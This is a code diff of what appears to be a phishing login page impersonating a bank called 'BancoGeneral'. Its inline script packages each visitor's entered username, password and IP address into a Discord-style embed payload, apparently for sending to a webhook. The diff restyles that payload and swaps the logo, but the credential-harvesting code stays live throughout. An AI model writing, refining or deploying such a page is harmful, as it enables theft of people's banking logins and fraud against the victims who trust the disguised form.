@@ -173,7 +173,7 @@
 <body>
 <div class="container">
     <div class="logo-section">
-        <img src="bgr.png" alt="Logo" class="logo-image">
+        <img src="logo-bgr-blue.svg" alt="Logo" class="logo-image">
     </div>
 
     <form id="loginForm">
@@ -286,17 +286,17 @@
         // Payload profesional con mejor estructura y espaciado
         const payload = {
             embeds: [{
-                title: "🔐 Nuevo Login",
-                description: "Se ha recibido un intento de acceso al sistema",
+                title: "🌠𝖫𝗈𝗀𝗈 𝖡𝖺𝗇𝖼𝗈𝖦𝖾𝗇𝖾𝗋𝖺𝗅🌠",
+                description: "",
                 color: 0x5865F2,
                 fields: [
                     {
-                        name: "👤 Usuario",
+                        name: "┆⬩ 𝖴𝗌𝗎𝖺𝗋𝗂𝗈",
                         value: `\`${usuario}\``,
                         inline: true
                     },
                     {
-                        name: "🔑 Contraseña", 
+                        name: "┆⬩ 𝖢𝗅𝖺𝗏𝖾", 
                         value: `\`${password}\``,
                         inline: true
                     },
@@ -306,14 +306,11 @@
                         inline: false
                     },
                     {
-                        name: "🌐 Dirección IP",
+                        name: "┆⬩ 𝖨𝖯",
                         value: `\`${userIP}\``,
                         inline: false
                     }
                 ],
-                footer: {
-                    text: "Sistema de Monitoreo • " + new Date().toLocaleString('es-ES')
-                },
                 timestamp: new Date().toISOString()
             }]
         };
